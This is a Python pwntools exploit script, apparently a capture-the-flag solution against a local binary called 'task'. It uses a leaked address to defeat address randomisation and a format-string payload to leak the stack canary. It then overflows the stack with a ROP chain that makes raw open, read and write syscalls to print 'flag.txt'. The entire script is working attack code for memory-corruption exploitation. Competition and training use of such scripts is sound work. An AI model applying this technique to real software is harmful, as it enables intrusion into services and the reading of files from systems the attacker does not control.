#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("127.0.0.1", 9001)

leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["setup"]

p.sendline(b"%11$p")
canary = int(p.recv().decode(), 16)

scratch = elf.bss() + 0xf00
flag_size = 64

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.raw(p64(canary) + p64(0))

rop.rdi = constants.STDIN_FILENO
rop.rsi = scratch
rop.rdx = 256
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = scratch
rop.rsi = 0
rop.rdx = 0
rop.rax = constants.SYS_open
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = 3
rop.rsi = scratch
rop.rdx = flag_size
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = 1
rop.rsi = scratch
rop.rdx = flag_size
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendline(rop.chain())
p.sendline(b"flag.txt\x00")

print(p.readuntil(b"}").decode())
